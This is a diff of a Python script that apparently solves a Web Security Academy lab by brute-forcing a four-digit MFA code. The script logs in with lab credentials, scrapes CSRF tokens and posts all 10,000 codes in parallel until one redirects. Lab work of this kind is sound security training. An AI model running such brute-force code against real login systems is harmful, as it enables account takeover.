@@ -9,19 +9,11 @@ if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
 """
 # For me only
-site = 'ac741fc81e815a2f8060849b00e0009a.web-security-academy.net'
-s = requests.Session()
+site = 'ac671f851f15b44e8031427e00b50093.web-security-academy.net'
 answer = multiprocessing.Value('i', -1)
 
 
-# Credit to https://stackoverflow.com/questions/14822184/is-there-a-ceiling-equivalent-of-operator-in-python
-# For this function idea
-def ceildiv(a, b):
-    return -(-a // b)
-
-
-def try_code(csrf, code):
-    # Second page
+def try_code(csrf, code, s):
     login2_url = f'https://{site}/login2'
     login2data = {
         'csrf': csrf,
@@ -29,12 +21,14 @@ def try_code(csrf, code):
     }
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
     if resp.status_code == 302:
-        with answer.get_lock():
-            answer.value = int(login2data["mfa-code"])
+        print(f"PIN is {login2data['mfa-code']}")
+        exit()
+    else:
+        print(".", end='')
     return resp.status_code
 
 
-def get_csrf():
+def get_csrf(s):
     login_url = f'https://{site}/login'
     resp = s.get(login_url)
     soup = BeautifulSoup(resp.text, 'html.parser')
@@ -45,40 +39,20 @@ def get_csrf():
         'username': 'carlos',
         'password': 'montoya'
     }
-    # print(f'Logging in as carlos:montoya')
     resp = s.post(login_url, data=logindata)
-    # print(f'Login response: {resp.text}')
-
     soup = BeautifulSoup(resp.text, 'html.parser')
     return soup.find('input', {'name': 'csrf'}).get('value')
 
 
-def dispatch_requests(range_arg):
-    low = range_arg[0]
-    high = range_arg[1]
-    iterations = ceildiv(high - low + 1, 2)
-    for x in range(iterations):
-        if answer.value >= 0:
-            return
-        csrf = get_csrf()
-        if try_code(csrf, x) == 302:
-            break
-        else:
-            second_try = try_code(csrf, x + iterations)
-            if second_try == 302:
-                break
-            elif second_try == 400:
-                csrf = get_csrf()
-                if try_code(csrf, x + iterations) == 302:
-                    break
+def dispatch_requests(arg):
+    csrf = get_csrf(arg[1])
+    try_code(csrf, arg[0], arg[1])
 
 
 if __name__ == '__main__':
-    processing = [[0, 2500], [2501, 5000], [5001, 7500], [7501, 9999]]  # This list is geared for 4 cpus
-    p = multiprocessing.Pool(multiprocessing.cpu_count())
-    p.map(dispatch_requests, processing)
+    s = requests.Session()
+    p = multiprocessing.Pool(40)
+    processing = range(10000)
+    p.map(dispatch_requests, [[x, s] for x in processing])
     p.close()
-    if answer.value >= 0:
-        print(f"PIN: {answer.value}")
-    else:
-        print("PIN not found.")
+    print("Sorry, PIN not found.")
